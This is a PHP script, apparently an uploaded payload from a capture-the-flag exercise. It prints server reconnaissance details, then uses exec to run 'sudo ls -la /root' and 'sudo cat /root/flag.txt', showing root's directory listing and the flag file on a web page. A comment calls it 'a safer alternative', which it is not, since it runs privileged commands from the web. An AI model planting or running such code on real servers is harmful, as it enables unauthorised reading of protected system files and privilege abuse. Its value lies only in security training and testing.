<?php
// A safer alternative that displays system information
echo "<h2>System Information</h2>";
echo "<pre>";
echo "PHP Version: " . phpversion() . "\n";
echo "Server Software: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
echo "Server OS: " . php_uname('s') . " " . php_uname('r') . "\n";
echo "Server Name: " . php_uname('n') . "\n";
echo "</pre>";

// PHP script to list files in /root directory using sudo
echo "<h2>Files in /root directory</h2>";
echo "<pre>";

// Use exec with sudo to run the ls command on /root
$command = 'sudo ls -la /root';
$output = array();
$return_var = 0;

exec($command, $output, $return_var);

// Check if the command was successful
if ($return_var === 0) {
    echo "Command executed successfully:\n\n";
    foreach ($output as $line) {
        echo htmlspecialchars($line) . "\n";
    }
} else {
    echo "Error executing command. Return code: $return_var\n";
    echo "This could be due to:\n";
    echo "- PHP not having permission to run sudo\n";
    echo "- sudo requiring a password\n";
    echo "- sudo not being configured for this command\n";
}

echo "</pre>";


// PHP script to display the contents of /root/flag.txt using sudo
echo "<h2>Contents of /root/flag.txt</h2>";
echo "<pre>";

// Use exec with sudo to read the file
$command = 'sudo cat /root/flag.txt';
$output = array();
$return_var = 0;

exec($command, $output, $return_var);

// Check if the command was successful
if ($return_var === 0) {
    if (empty($output)) {
        echo "File exists but appears to be empty.";
    } else {
        echo "File contents:\n\n";
        foreach ($output as $line) {
            echo htmlspecialchars($line) . "\n";
        }
    }
} else {
    echo "Error executing command. Return code: $return_var\n";
    echo "This could be due to:\n";
    echo "- The file /root/flag.txt does not exist\n";
    echo "- PHP not having permission to run sudo\n";
    echo "- sudo requiring a password\n";
    echo "- sudo not being configured for this command\n";
}

echo "</pre>";
?>
